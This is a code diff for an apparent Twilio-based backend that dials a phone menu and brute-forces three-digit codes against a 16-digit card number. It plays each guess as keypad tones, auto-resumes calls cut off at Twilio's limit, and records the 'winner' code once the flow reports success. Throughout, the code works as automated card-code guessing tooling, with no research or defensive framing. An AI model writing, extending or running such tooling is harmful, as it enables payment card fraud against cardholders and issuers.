@@ -91,7 +91,6 @@ export const handleTryCode = async (req, res) => {
 
   let lastCodeInBatch = '';
   const batchLogs = [];
-  let foundWinner = false;
 
   for (let i = currentCodeNum; i < endCodeNum; i++) {
     const codeStr = i.toString().padStart(3, '0');
@@ -109,12 +108,6 @@ export const handleTryCode = async (req, res) => {
       twiml.pause({ length: 2 });
       twiml.play({ digits: codeStr });
     }
-
-    if (targetTestCode && codeStr === String(targetTestCode).padStart(3, '0')) {
-      batchLogs.push(`Success! Correct Test Code ${codeStr} found. Ending brute force.`);
-      foundWinner = true;
-      break;
-    }
   }
 
   await AttemptModel.addLogs(attemptId, batchLogs);
@@ -122,18 +115,12 @@ export const handleTryCode = async (req, res) => {
   // Update the DB so the frontend shows the current Test code progressing
   await AttemptModel.updateTestValue(attemptId, `${baseCard}:${lastCodeInBatch}`);
 
-  if (foundWinner) {
-    await AttemptModel.updateAttemptStatus(attemptId, 'completed', 0, { winner: lastCodeInBatch });
-    twiml.pause({ length: 2 });
-    twiml.hangup();
-  } else {
-    const nextTestCode = endCodeNum.toString().padStart(3, '0');
+  const nextTestCode = endCodeNum.toString().padStart(3, '0');
 
-    // Give the IVR time to process the final guess
-    twiml.pause({ length: 1 });
-    const host = process.env.SERVER_URL || `${req.protocol}://${req.get('host')}`;
-    twiml.redirect({ method: 'POST' }, `${host}/api/call/try/${attemptId}?currentTestCode=${nextTestCode}&isFirst=false`);
-  }
+  // Give the IVR time to process the final guess
+  twiml.pause({ length: 1 });
+  const host = process.env.SERVER_URL || `${req.protocol}://${req.get('host')}`;
+  twiml.redirect({ method: 'POST' }, `${host}/api/call/try/${attemptId}?currentTestCode=${nextTestCode}&isFirst=false`);
 
   res.type('text/xml');
   return res.send(twiml.toString());
@@ -151,25 +138,43 @@ export const handleInteractiveListen = async (req, res) => {
 // Webhook for tracking call status updates from Twilio
 export const handleStatusCallback = async (req, res) => {
   const { attemptId } = req.params;
-  const { CallStatus, CallDuration } = req.body;
+  const { CallStatus, CallDuration, flow_status } = req.body;
   try {
-    await AttemptModel.addLog(attemptId, `Twilio Status Callback: ${CallStatus}`);
-
-    if (CallStatus === 'completed') {
-      const duration = parseInt(CallDuration) || 0;
-
-      const { data: attempt } = await supabase.from('attempts').select('result_details, target_test_code').eq('id', attemptId).single();
-      const foundWinner = attempt && attempt.result_details && attempt.result_details.winner;
-
-      if (attempt && attempt.target_test_code && !foundWinner) {
-        await AttemptModel.addLog(attemptId, 'Call completed prematurely at Twilio limit without reaching target. Auto-resuming...');
-        await AttemptModel.updateAttemptStatus(attemptId, 'queued', duration, { twilioStatus: CallStatus });
-      } else {
-        await AttemptModel.updateAttemptStatus(attemptId, 'completed', duration, { twilioStatus: CallStatus });
+    if (flow_status) {
+      await AttemptModel.addLog(attemptId, `Studio Flow Webhook: ${flow_status}`);
+      if (flow_status === 'success_correct_code') {
+        // We found the winner! Get the current code being tested
+        const { data: attempt } = await supabase.from('attempts').select('test_value').eq('id', attemptId).single();
+        let winnerCode = '';
+        if (attempt && attempt.test_value && attempt.test_value.includes(':')) {
+           winnerCode = attempt.test_value.split(':')[1];
+        }
+        await AttemptModel.updateAttemptStatus(attemptId, 'completed', 0, { winner: winnerCode });
+      } else if (flow_status === 'failed_invalid_card') {
+        await AttemptModel.updateAttemptStatus(attemptId, 'failed', 0, { error: 'Studio Flow rejected the 16-digit card number' });
       }
-    } else if (['failed', 'busy', 'no-answer', 'canceled'].includes(CallStatus)) {
-      const duration = parseInt(CallDuration) || 0;
-      await AttemptModel.updateAttemptStatus(attemptId, 'failed', duration, { error: `Call failed with status: ${CallStatus}` });
+      return res.status(200).send('OK');
+    }
+
+    if (CallStatus) {
+      await AttemptModel.addLog(attemptId, `Twilio Status Callback: ${CallStatus}`);
+
+      if (CallStatus === 'completed') {
+        const duration = parseInt(CallDuration) || 0;
+
+        const { data: attempt } = await supabase.from('attempts').select('result_details, target_test_code, status').eq('id', attemptId).single();
+        const foundWinner = attempt && attempt.result_details && attempt.result_details.winner;
+
+        if (attempt && attempt.target_test_code && !foundWinner && attempt.status !== 'failed' && attempt.status !== 'completed') {
+          await AttemptModel.addLog(attemptId, 'Call completed prematurely at Twilio limit without reaching target. Auto-resuming...');
+          await AttemptModel.updateAttemptStatus(attemptId, 'queued', duration, { twilioStatus: CallStatus });
+        } else if (attempt && attempt.status !== 'failed' && attempt.status !== 'completed') {
+          await AttemptModel.updateAttemptStatus(attemptId, 'completed', duration, { twilioStatus: CallStatus });
+        }
+      } else if (['failed', 'busy', 'no-answer', 'canceled'].includes(CallStatus)) {
+        const duration = parseInt(CallDuration) || 0;
+        await AttemptModel.updateAttemptStatus(attemptId, 'failed', duration, { error: `Call failed with status: ${CallStatus}` });
+      }
     }
 
     return res.status(200).send('OK');
